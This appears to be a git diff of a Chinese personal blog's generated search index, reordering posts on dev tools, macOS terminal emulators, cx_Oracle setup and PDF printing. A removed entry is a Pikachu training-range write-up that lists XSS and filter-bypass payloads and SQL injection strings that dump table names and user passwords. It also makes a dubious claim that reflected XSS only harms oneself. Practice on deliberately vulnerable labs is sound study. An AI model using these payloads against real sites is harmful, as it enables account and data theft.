+<li>BeyondCompare</li>
+<li>Navicat Premium 12</li>
+<li>Bandizip</li>
+<li>Postman</li>
+<li>Shadowsocks</li>
+<li>SpeedPan</li>
+<li>FSCapture</li>
+</ul>
+<h4 id="你最理想的工作环境是什么？"><a href="#你最理想的工作环境是什么？" class="headerlink" title="你最理想的工作环境是什么？"></a>你最理想的工作环境是什么？</h4><p>曾经有一天，突然觉得美剧<Silicon Valley>中，Richard他们一起工作生活的那个House就是我最渴望的工作环境。<br><img src="/images/siliconvalley.jpg" alt="&quot;siliconvalley&quot;"></p>
+<h4 id="你平时获得工作灵感的方式有哪些？"><a href="#你平时获得工作灵感的方式有哪些？" class="headerlink" title="你平时获得工作灵感的方式有哪些？"></a>你平时获得工作灵感的方式有哪些？</h4><p>逛<a href="https://www.zhihu.com/">知乎</a>，<a href="https://www.v2ex.com/">V2EX</a>。有时候会觉得，可能我一直都未曾真正有过灵感。</p>
+<h4 id="推荐一件生活中的利器给大家。"><a href="#推荐一件生活中的利器给大家。" class="headerlink" title="推荐一件生活中的利器给大家。"></a>推荐一件生活中的利器给大家。</h4><p>身边越来越多的人开始切换到了Windows10，每次看到别人任务栏上不曾使却又存在着的搜索框，我就会在心里小小的“鄙视”一下这个人。<a href="https://jingyan.baidu.com/article/a378c960a7f625b32828303d.html"><strong>单击三次鼠标即可关闭</strong></a>，不要让它再占用你“寸土寸金”的任务栏啦！<br>还有将键盘上的CapsLock键映射为Ctrl键，相信我，世界从此不同。</p>
+]]></content>
+      <tags>
+        <tag>程序员的自我修养</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>macOS下的终端模拟软件</title>
+    <url>/2022/05/04/2022/05-04_macOS%E4%B8%8B%E7%9A%84%E7%BB%88%E7%AB%AF%E6%A8%A1%E6%8B%9F%E8%BD%AF%E4%BB%B6/</url>
+    <content><![CDATA[<p>对我来说，没有一个好用的终端模拟软件，MBP就无法成为一个合格的生产力工具…<br>如果你也有和我一样的困扰，很抱歉，这篇博客或许并不能给你一个想要的答案。<br>相比于一个答案，这篇博客更像一堆抱怨。<br>2022.05.20更新：现在有答案了。我自己写了一个<a href="https://github.com/yutianqi/SessionManager">工具</a>…</p>
+<span id="more"></span>
+
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>从Windows切换到Mac之后，第一个很怀念的软件是Everything，第二个就是XShell了。<br>在网上也搜了很久，发现几个现象：</p>
+<ol>
+<li>部分Mac用户很骄傲，如果你用得不习惯，那是你的问题，而不是Mac的问题。</li>
+<li>推荐最多的就是iTerm2。</li>
+<li>无论推荐的是什么，下面都有人赞同，也有人反对。</li>
+</ol>
+<h1 id="我的需求"><a href="#我的需求" class="headerlink" title="我的需求"></a>我的需求</h1><p>其实归根结节就是用户群不一样，大家都在自说自话。而我也很清楚自己的需求并不算大众，从用户画像来说比较偏向运维工程师，大概可以总结为以下几点（优先级由高到低）：</p>
+<h2 id="基本诉求"><a href="#基本诉求" class="headerlink" title="基本诉求"></a>基本诉求</h2><ol>
+<li>Session管理<br>因为环境都在公有云Linux服务器上，而且都是7节点起步的集群。所以需要支持保存Session，多层级分组。</li>
+<li>支持登录脚本<br>因为集群通常只有一台主节点有公网IP，其他节点都要通过主节点跳转。所以需要通过登录脚本在登录到主节点之后自动跳转到其他节点。</li>
+<li>多窗口同时输入<br>因为同一微服务可能部署在多个节点上，并且没有使用成熟的日志分析系统，所以还有多个节点同时看日志，同时操作分析问题的场景。</li>
+<li>自定义快捷键<br>Session复制，Tab切换，Tab重命名…</li>
+<li>Session文件可编辑<br>因为前面所说的环境都是集群，且经常有全新IP的新环境，所以需要支持手动构造Session配置，这样在环境变更之后，可以通过类似CSV文件快速生成对应的Session配置。</li>
+<li>稳定<br>前面一切诉求的基础。</li>
+</ol>
+<h2 id="加分项"><a href="#加分项" class="headerlink" title="加分项"></a>加分项</h2><ol>
+<li>高颜值<br>好心情很重要…</li>
+<li>支持快捷命令<br>很多冗长的命令没有必要反复输入，通常情况下，这一点可以通过alias解决，但是我面对的服务器很多都是不允许我自定义设置的。</li>
+<li>记录文本的操作日志<br>作为小白，“偷师”利器…</li>
+<li>内嵌SFTP工具<br>就不需要再装Transmit或者FileZilla了。并且这种内嵌SFTP工具通常都支持跳转到当前所在目录，真的很好用。</li>
+</ol>
+<h1 id="目前的选择"><a href="#目前的选择" class="headerlink" title="目前的选择"></a>目前的选择</h1><p>以上几个需求，在Windows上XShell，MobaXterm，SecureCRT都可以满足我的需求。但是在macOS下，目前似乎还没有，简单的试用过如下几个…</p>
+<h2 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h2><p>总的来说上面几点都满足了，应该是和我的需求契合度最高的了，也是我目前的选择。但是多窗口同时输入存在如下问题：</p>
+<ol>
+<li>需要在单独的Command Windows进行，不支持上下查找历史命令，不支持tab联想，不支持类似Ctrl+C这种特殊命令，并且Command Windows会占用一部分额外的空间。</li>
+<li>不稳定，这也是最让我无法接受的地方。Command Windows偶尔会无法输入，需要关掉再打开。在多窗口执行类似top命令后，偶现鼠标丢失，无法选择窗口文本。</li>
+<li>设置例外窗口操作复杂。</li>
+</ol>
+<h2 id="Termius"><a href="#Termius" class="headerlink" title="Termius"></a>Termius</h2><p>Session只支持单一层级。</p>
+<h2 id="iTerm2"><a href="#iTerm2" class="headerlink" title="iTerm2"></a>iTerm2</h2><p>不支持Session管理。</p>
+<h2 id="CrossOver安装Xshell7"><a href="#CrossOver安装Xshell7" class="headerlink" title="CrossOver安装Xshell7"></a>CrossOver安装Xshell7</h2><p>CrossOver官方没说支持，安装之后无法启动…         </p>
+<h2 id="CrossOver安装MobaXterm"><a href="#CrossOver安装MobaXterm" class="headerlink" title="CrossOver安装MobaXterm"></a>CrossOver安装MobaXterm</h2><p>CrossOver官方说支持，安装过程卡在安装.net 4.6.2…         </p>
+<h2 id="FinalShell"><a href="#FinalShell" class="headerlink" title="FinalShell"></a>FinalShell</h2><p>貌似已经停止维护了，而且网评资源占用很高…</p>
+<h2 id="NuoShell"><a href="#NuoShell" class="headerlink" title="NuoShell"></a>NuoShell</h2><p>不支持多窗口同时输入。</p>
+<h2 id="NuoShell-1"><a href="#NuoShell-1" class="headerlink" title="NuoShell"></a>NuoShell</h2><p>不支持多窗口同时输入。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Python使用cx_Oracle操作Oracle数据库</title>
+    <url>/2018/02/13/2022/11-27_Python%E4%BD%BF%E7%94%A8cx-Oracle%E6%93%8D%E4%BD%9COracle%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
+    <content><![CDATA[<p>本文主要记录Python使用cx_Oracle组件操作Oracle数据库的过程。</p>
+<span id="more"></span>
+
+<h2 id="–-gt-Windows"><a href="#–-gt-Windows" class="headerlink" title="–&gt; Windows"></a>–&gt; Windows</h2><h3 id="环境信息"><a href="#环境信息" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
+<li>OS：Windows 7 64bit</li>
+<li>Python：2.7.14 64bit</li>
+<li>cx_Oracle：6.1-cp27-cp27m-win_amd64</li>
+<li>instantclient：basic-windows.x64-12.2.0.1.0</li>
+</ul>
+<h3 id="安装cx-Oracle"><a href="#安装cx-Oracle" class="headerlink" title="安装cx_Oracle"></a>安装cx_Oracle</h3><h4 id="pip安装"><a href="#pip安装" class="headerlink" title="pip安装"></a>pip安装</h4><ul>
+<li>使用如下指令安装cx_Oracle<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install cx_Oracle</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h4><ul>
+<li>打开 <a href="https://pypi.python.org/pypi/cx_Oracle">https://pypi.python.org/pypi/cx_Oracle</a>    </li>
+<li>下载cx_Oracle-6.1-cp27-cp27m-win_amd64.whl文件      </li>
+<li>使用如下指令安装whl文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install cx_Oracle-6.1-cp27-cp27m-win_amd64.whl</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="安装Oralce客户端"><a href="#安装Oralce客户端" class="headerlink" title="安装Oralce客户端"></a>安装Oralce客户端</h3><ul>
+<li>打开 <a href="http://www.oracle.com/technetwork/topics/winx64soft-089540.html">http://www.oracle.com/technetwork/topics/winx64soft-089540.html</a>     </li>
+<li>下载instantclient-basic-windows.x64-12.2.0.1.0.zip文件   </li>
+<li>解压zip文件       </li>
+<li>将解压目录添加为环境变量ORACLE_HOME       </li>
+<li>将环境变量ORACLE_HOME添加到环境变量Path       </li>
+</ul>
+<h2 id="–-gt-Linux"><a href="#–-gt-Linux" class="headerlink" title="–&gt; Linux"></a>–&gt; Linux</h2><h3 id="环境信息-1"><a href="#环境信息-1" class="headerlink" title="环境信息"></a>环境信息</h3><ul>
+<li>OS：Linux dsic1h1 3.10.0-229.x86_64 </li>
+<li>Python：2.7.14 64bit</li>
+<li>cx_Oracle：6.1-cp27-cp27m-manylinux1_x86_64.whl</li>
+<li>instantclient：basic-linux.x64-12.2.0.1.0</li>
+</ul>
+<h3 id="安装cx-Oracle-1"><a href="#安装cx-Oracle-1" class="headerlink" title="安装cx_Oracle"></a>安装cx_Oracle</h3><h4 id="pip安装-1"><a href="#pip安装-1" class="headerlink" title="pip安装"></a>pip安装</h4><ul>
+<li>使用如下指令安装cx_Oracle<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install cx_Oracle</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h4 id="手动安装-1"><a href="#手动安装-1" class="headerlink" title="手动安装"></a>手动安装</h4><ul>
+<li>打开 <a href="https://pypi.python.org/pypi/cx_Oracle">https://pypi.python.org/pypi/cx_Oracle</a>    </li>
+<li>下载cx_Oracle-6.1-cp27-cp27m-manylinux1_x86_64.whl文件      </li>
+<li>上传并使用如下指令安装whl文件<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install cx_Oracle-6.1-cp27-cp27m-manylinux1_x86_64.whl</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="安装Oralce客户端-1"><a href="#安装Oralce客户端-1" class="headerlink" title="安装Oralce客户端"></a>安装Oralce客户端</h3><ul>
+<li>打开 <a href="http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html">http://www.oracle.com/technetwork/topics/linuxx86-64soft-092277.html</a>     </li>
+<li>下载instantclient-basic-linux.x64-12.2.0.1.0.zip文件   </li>
+<li>上传并解压zip文件       </li>
+<li>新增环境变量LD_LIBRARY_PATH<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 可将以下记录写入环境变量配置文件，如~/.bashrc，~/.profile</span><br><span class="line"># 其中/tmp/instantclient_12_2为instantclient解压目录</span><br><span class="line"></span><br><span class="line">export LD_LIBRARY_PATH=$&#123;LD_LIBRARY_PATH&#125;:/tmp/instantclient_12_2       </span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="–-gt-Python下执行测试验证"><a href="#–-gt-Python下执行测试验证" class="headerlink" title="–&gt; Python下执行测试验证"></a>–&gt; Python下执行测试验证</h2><ul>
+<li>相关代码如下<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import cx_Oracle  </span><br><span class="line">dsn = cx_Oracle.makedsn(&quot;192.168.0.233&quot;,            # 数据库主机IP</span><br><span class="line">                        1521,                       # 数据库服务端口</span><br><span class="line">                        &quot;SID&quot;)                      # 数据库实例SID</span><br><span class="line">conn = cx_Oracle.connect(&quot;username&quot;,                # 连接用户</span><br><span class="line">                         &quot;passwd&quot;,                  # 用户密码</span><br><span class="line">                         dsn)                       </span><br><span class="line">curs = conn.cursor()  </span><br><span class="line">sql = &quot;select * from TBL_NAME where rownum&lt;10&quot;</span><br><span class="line">rr = curs.execute(sql)  </span><br><span class="line">row = curs.fetchone()  </span><br><span class="line">print row[0]  </span><br><span class="line">curs.close()                                                  </span><br><span class="line">conn.close()  </span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>Python</tag>
+        <tag>Oracle</tag>
+        <tag>cx_Oracle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>macOS下的PDF打印</title>
+    <url>/2022/11/27/2022/11-27_macOS%E4%B8%8B%E7%9A%84PDF%E6%89%93%E5%8D%B0/</url>
+    <content><![CDATA[<p>这两天想在Mac上将一个可编辑的Word文件，简单的变成不可编辑的图片版PDF，但是实际情况感觉并不简单…</p>
+<span id="more"></span>
+<p>之前在Windows上类似的诉求都是用Foxit的虚拟打印机功能来实现的，只需要在打印的时候勾选“Print as image”即可。<br>按照类似的思路，在Mac上装了几款虚拟打印机也试了几款APP，但大多数都只能将文档转为文字版PDF，也就是是可复制的，而我的诉求是不可复制的。虽然这点可以通过APP设置文档的权限来实现，但是这样未免显得太过“刻意”…为数不多的某国产APP可以满足我的诉求，但是又要收取不便宜的订阅费，而我并不太想为这个诉求买单并安装一个额外的APP，因为，我觉得并不算太复杂…<br>将这个需求拆分一下，就简单很多了，一个是将现有的文字版PDF文档转为图片，一个是将图片重新转为PDF。前者PyMuPDF可实现，后者PyMuPDF/pillow/img2pdf均可实现，只是最终PDF文件大小和清晰度略有差异。<br><a href="https://github.com/yutianqi/FileProcessor/blob/main/pdf_processor.py">“Talk is cheap, show me the code.”</a></p>
+]]></content>
+      <tags>
+        <tag>2022</tag>
+        <tag>十一月</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SessionManager：macOS下的终端模拟解决方案</title>
-    <url>/2023/04/14/SessionManager/</url>
+    <url>/2023/04/14/2023/04-14_SessionManager/</url>
     <content><![CDATA[<p>对我来说，没有一个好用的终端模拟软件，MBP就无法成为一个合格的生产力工具…</p>
 <span id="more"></span>
 
@@ -710,63 +519,8 @@ spring.cloud.config.server.svn.password=password
 ]]></content>
   </entry>
   <entry>
-    <title>macOS下的PDF打印</title>
-    <url>/2022/11/27/macOS%E4%B8%8B%E7%9A%84PDF%E6%89%93%E5%8D%B0/</url>
-    <content><![CDATA[<p>这两天想在Mac上将一个可编辑的Word文件，简单的变成不可编辑的图片版PDF，但是实际情况感觉并不简单…</p>
-<span id="more"></span>
-<p>之前在Windows上类似的诉求都是用Foxit的虚拟打印机功能来实现的，只需要在打印的时候勾选“Print as image”即可。<br>按照类似的思路，在Mac上装了几款虚拟打印机也试了几款APP，但大多数都只能将文档转为文字版PDF，也就是是可复制的，而我的诉求是不可复制的。虽然这点可以通过APP设置文档的权限来实现，但是这样未免显得太过“刻意”…为数不多的某国产APP可以满足我的诉求，但是又要收取不便宜的订阅费，而我并不太想为这个诉求买单并安装一个额外的APP，因为，我觉得并不算太复杂…<br>将这个需求拆分一下，就简单很多了，一个是将现有的文字版PDF文档转为图片，一个是将图片重新转为PDF。前者PyMuPDF可实现，后者PyMuPDF/pillow/img2pdf均可实现，只是最终PDF文件大小和清晰度略有差异。<br><a href="https://github.com/yutianqi/FileProcessor/blob/main/pdf_processor.py">“Talk is cheap, show me the code.”</a></p>
-]]></content>
-      <tags>
-        <tag>2022</tag>
-        <tag>十一月</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>macOS下的终端模拟软件</title>
-    <url>/2022/05/04/macOS%E4%B8%8B%E7%9A%84%E7%BB%88%E7%AB%AF%E6%A8%A1%E6%8B%9F%E8%BD%AF%E4%BB%B6/</url>
-    <content><![CDATA[<p>对我来说，没有一个好用的终端模拟软件，MBP就无法成为一个合格的生产力工具…<br>如果你也有和我一样的困扰，很抱歉，这篇博客或许并不能给你一个想要的答案。<br>相比于一个答案，这篇博客更像一堆抱怨。<br>2022.05.20更新：现在有答案了。我自己写了一个<a href="https://github.com/yutianqi/SessionManager">工具</a>…</p>
-<span id="more"></span>
-
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>从Windows切换到Mac之后，第一个很怀念的软件是Everything，第二个就是XShell了。<br>在网上也搜了很久，发现几个现象：</p>
-<ol>
-<li>部分Mac用户很骄傲，如果你用得不习惯，那是你的问题，而不是Mac的问题。</li>
-<li>推荐最多的就是iTerm2。</li>
-<li>无论推荐的是什么，下面都有人赞同，也有人反对。</li>
-</ol>
-<h1 id="我的需求"><a href="#我的需求" class="headerlink" title="我的需求"></a>我的需求</h1><p>其实归根结节就是用户群不一样，大家都在自说自话。而我也很清楚自己的需求并不算大众，从用户画像来说比较偏向运维工程师，大概可以总结为以下几点（优先级由高到低）：</p>
-<h2 id="基本诉求"><a href="#基本诉求" class="headerlink" title="基本诉求"></a>基本诉求</h2><ol>
-<li>Session管理<br>因为环境都在公有云Linux服务器上，而且都是7节点起步的集群。所以需要支持保存Session，多层级分组。</li>
-<li>支持登录脚本<br>因为集群通常只有一台主节点有公网IP，其他节点都要通过主节点跳转。所以需要通过登录脚本在登录到主节点之后自动跳转到其他节点。</li>
-<li>多窗口同时输入<br>因为同一微服务可能部署在多个节点上，并且没有使用成熟的日志分析系统，所以还有多个节点同时看日志，同时操作分析问题的场景。</li>
-<li>自定义快捷键<br>Session复制，Tab切换，Tab重命名…</li>
-<li>Session文件可编辑<br>因为前面所说的环境都是集群，且经常有全新IP的新环境，所以需要支持手动构造Session配置，这样在环境变更之后，可以通过类似CSV文件快速生成对应的Session配置。</li>
-<li>稳定<br>前面一切诉求的基础。</li>
-</ol>
-<h2 id="加分项"><a href="#加分项" class="headerlink" title="加分项"></a>加分项</h2><ol>
-<li>高颜值<br>好心情很重要…</li>
-<li>支持快捷命令<br>很多冗长的命令没有必要反复输入，通常情况下，这一点可以通过alias解决，但是我面对的服务器很多都是不允许我自定义设置的。</li>
-<li>记录文本的操作日志<br>作为小白，“偷师”利器…</li>
-<li>内嵌SFTP工具<br>就不需要再装Transmit或者FileZilla了。并且这种内嵌SFTP工具通常都支持跳转到当前所在目录，真的很好用。</li>
-</ol>
-<h1 id="目前的选择"><a href="#目前的选择" class="headerlink" title="目前的选择"></a>目前的选择</h1><p>以上几个需求，在Windows上XShell，MobaXterm，SecureCRT都可以满足我的需求。但是在macOS下，目前似乎还没有，简单的试用过如下几个…</p>
-<h2 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h2><p>总的来说上面几点都满足了，应该是和我的需求契合度最高的了，也是我目前的选择。但是多窗口同时输入存在如下问题：</p>
-<ol>
-<li>需要在单独的Command Windows进行，不支持上下查找历史命令，不支持tab联想，不支持类似Ctrl+C这种特殊命令，并且Command Windows会占用一部分额外的空间。</li>
-<li>不稳定，这也是最让我无法接受的地方。Command Windows偶尔会无法输入，需要关掉再打开。在多窗口执行类似top命令后，偶现鼠标丢失，无法选择窗口文本。</li>
-<li>设置例外窗口操作复杂。</li>
-</ol>
-<h2 id="Termius"><a href="#Termius" class="headerlink" title="Termius"></a>Termius</h2><p>Session只支持单一层级。</p>
-<h2 id="iTerm2"><a href="#iTerm2" class="headerlink" title="iTerm2"></a>iTerm2</h2><p>不支持Session管理。</p>
-<h2 id="CrossOver安装Xshell7"><a href="#CrossOver安装Xshell7" class="headerlink" title="CrossOver安装Xshell7"></a>CrossOver安装Xshell7</h2><p>CrossOver官方没说支持，安装之后无法启动…         </p>
-<h2 id="CrossOver安装MobaXterm"><a href="#CrossOver安装MobaXterm" class="headerlink" title="CrossOver安装MobaXterm"></a>CrossOver安装MobaXterm</h2><p>CrossOver官方说支持，安装过程卡在安装.net 4.6.2…         </p>
-<h2 id="FinalShell"><a href="#FinalShell" class="headerlink" title="FinalShell"></a>FinalShell</h2><p>貌似已经停止维护了，而且网评资源占用很高…</p>
-<h2 id="NuoShell"><a href="#NuoShell" class="headerlink" title="NuoShell"></a>NuoShell</h2><p>不支持多窗口同时输入。</p>
-<h2 id="NuoShell-1"><a href="#NuoShell-1" class="headerlink" title="NuoShell"></a>NuoShell</h2><p>不支持多窗口同时输入。</p>
-]]></content>
-  </entry>
-  <entry>
     <title>Mac与PC：一个Windows用户使用Mac的一些分享</title>
-    <url>/2023/08/15/%E4%B8%80%E4%B8%AAWindows%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8Mac%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%86%E4%BA%AB/</url>
+    <url>/2023/08/15/2023/08-15_%E4%B8%80%E4%B8%AAWindows%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8Mac%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%86%E4%BA%AB/</url>
     <content><![CDATA[<p>作为一个Windows的重度用户，一直很想体验一下Mac，在入手了Mac后，发现二者的工作流还是存在一些差异的。<br>在这里做一个小小的分享，如果大家有更好的方案，也欢迎分享，希望大家友好讨论。<br>想对从Windows新切换到Mac的用户说：Mac的一些操作逻辑和PC是不一样的，大家要勇于接受变化。<br>想对Mac的老用户说：其实Windows现在已经有很大进步了，并且有些点个人觉得是超过Mac的，值得大家去体验。</p>
 <span id="more"></span>
 
@@ -781,60 +535,6 @@ spring.cloud.config.server.svn.password=password
         <tag>2023</tag>
         <tag>八月</tag>
         <tag>Mac</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pikachu靶场实战</title>
-    <url>/2024/07/18/2024/07-18_Pikachu%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/</url>
-    <content><![CDATA[<p>这是我的Pikachu靶场实战记录…</p>
-<span id="more"></span>
-
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://blog.csdn.net/qq_51577576/article/details/121857163">Phpstudy集成环境安装</a><br><a href="https://blog.csdn.net/qq_51577576/article/details/121850428">Pikachu靶场环境搭建</a></p>
-<h1 id="Pikachu攻击实战"><a href="#Pikachu攻击实战" class="headerlink" title="Pikachu攻击实战"></a>Pikachu攻击实战</h1><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h3><h3 id="验证码绕过-服务端"><a href="#验证码绕过-服务端" class="headerlink" title="验证码绕过(服务端)"></a>验证码绕过(服务端)</h3><h3 id="验证码绕过-客户端"><a href="#验证码绕过-客户端" class="headerlink" title="验证码绕过(客户端)"></a>验证码绕过(客户端)</h3><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型XSS-GET"><a href="#反射型XSS-GET" class="headerlink" title="反射型XSS(GET)"></a>反射型XSS(GET)</h3><p>我不认为反射型XSS能造成什么实质上的攻击，理由是整个过程发生在客户端(浏览器)，你触发执行的脚步只能攻击到你自己。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="反射型XSS-POST"><a href="#反射型XSS-POST" class="headerlink" title="反射型XSS(POST)"></a>反射型XSS(POST)</h3><p>和反射型XSS(GET)同理。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="built_in">document</span>.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>和反射型XSS同理。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h3><p>和反射型XSS同理。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h3><p>和存储型XSS同理。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h3><p>后台可能会对前台输入做一些校验以规避前面几个场景的XSS，但是客户端可以尝试通过大小写/双写/注释/编码干扰绕过校验。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;SCrIPT&gt;alert(<span class="number">1</span>)&lt;/ScRiPt&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h3><p>htmlspecialchars()是PHP里面把预定义的字符转换为HTML实体的函数，但是htmlspecialchars默认不对’处理，所以依旧可以构造绕过</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; onclick=&#x27;</span>alert(<span class="number">111</span>)<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="xss之href输出"><a href="#xss之href输出" class="headerlink" title="xss之href输出"></a>xss之href输出</h3><p>和反射型XSS同理。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">javascript:alert(<span class="number">111</span>)</span><br></pre></td></tr></table></figure>
-
-<h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p>和反射型XSS同理。</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27; &lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h3 id="CSRF-Get"><a href="#CSRF-Get" class="headerlink" title="CSRF(Get)"></a>CSRF(Get)</h3><h3 id="CSRF-Post"><a href="#CSRF-Post" class="headerlink" title="CSRF(Post)"></a>CSRF(Post)</h3><h3 id="CSRF-Token"><a href="#CSRF-Token" class="headerlink" title="CSRF Token"></a>CSRF Token</h3><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h3 id="预防措施"><a href="#预防措施" class="headerlink" title="预防措施"></a>预防措施</h3><h3 id="数字型注入-Post"><a href="#数字型注入-Post" class="headerlink" title="数字型注入(Post)"></a>数字型注入(Post)</h3><p>拦截查询请求，修改请求体id=1&amp;submit=%E6%9F%A5%E8%AF%A2，可以实现注入，获取额外信息</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询出所有用户记录</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"><span class="comment">-- 探测查询SQL列表(根据报错，确定后面注入SQL的写法)</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line"><span class="comment">-- 查询出当前数据库名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> database(), <span class="number">2</span>;</span><br><span class="line"><span class="comment">-- 查询出所有表名</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> group_concat(table_name),<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br><span class="line"><span class="comment">-- 查询出某张表数据</span></span><br><span class="line">id<span class="operator">=</span><span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> username,password <span class="keyword">from</span> users<span class="operator">&amp;</span>submit<span class="operator">=</span><span class="operator">%</span>E6<span class="operator">%</span><span class="number">9</span>F<span class="operator">%</span>A5<span class="operator">%</span>E8<span class="operator">%</span>AF<span class="operator">%</span>A2</span><br></pre></td></tr></table></figure>
-
-<h3 id="字符型注入-Get"><a href="#字符型注入-Get" class="headerlink" title="字符型注入(Get)"></a>字符型注入(Get)</h3><p>字符型注入需要对’进行闭合，拦截查询请求，修改请求体可以实现注入，获取额外信息</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询出所有用户记录</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>与数字型注入和字符型注入类似，可以先通过输入’执行查询确认注入类型，再根据类型执行具体注入。</p>
-<h3 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h3><p>强制将已有字符串查询条件闭合，并通过注释符将后续逻辑屏蔽。</p>
